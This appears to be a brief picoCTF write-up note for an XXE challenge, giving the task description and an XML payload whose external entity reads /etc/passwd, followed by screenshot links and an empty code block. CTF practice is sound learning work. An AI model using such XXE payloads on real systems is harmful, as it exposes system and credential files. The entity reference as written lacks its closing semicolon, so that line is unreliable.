#xxe #XXE 
##### Challenge Description

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:61991/)


```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<data><ID>&xxe</ID></data>
```

![](../../PicoCTF-assets/Pasted%20image%2020260308233622.png)




```

```

![](../../PicoCTF-assets/Pasted%20image%2020260308235239.png)

